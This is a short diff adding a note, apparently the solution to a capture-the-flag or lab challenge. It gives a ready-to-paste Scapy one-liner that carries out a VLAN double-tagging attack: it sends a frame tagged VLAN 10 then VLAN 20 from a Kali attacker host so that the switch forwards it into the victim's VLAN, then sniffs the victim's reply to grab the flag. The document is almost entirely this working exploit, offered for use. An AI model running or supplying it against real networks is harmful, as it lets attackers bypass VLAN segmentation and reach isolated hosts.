@@ -1,0 +1,11 @@
+Double-tagging exploit as one Scapy console line.
+
+On the Kali attacker run `sudo scapy`, then paste the line at the bottom:
+
+  - sends  Ether / 802.1Q(10) / 802.1Q(20) / IP / UDP
+  - switch1 strips the outer tag, the victim receives it on VLAN 20
+  - prints the victim's reply payload (the flag)
+
+Adjust eth1 / IPs / ports only if the lab differs from the challenge.
+
+sniff(iface="eth1", filter="udp and dst port 4444", count=1, timeout=5, prn=lambda p: p[UDP].payload.load, started_callback=lambda: sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(src="192.168.0.137",dst="192.168.20.10")/UDP(sport=4444,dport=1337)/b"flag?", iface="eth1"))
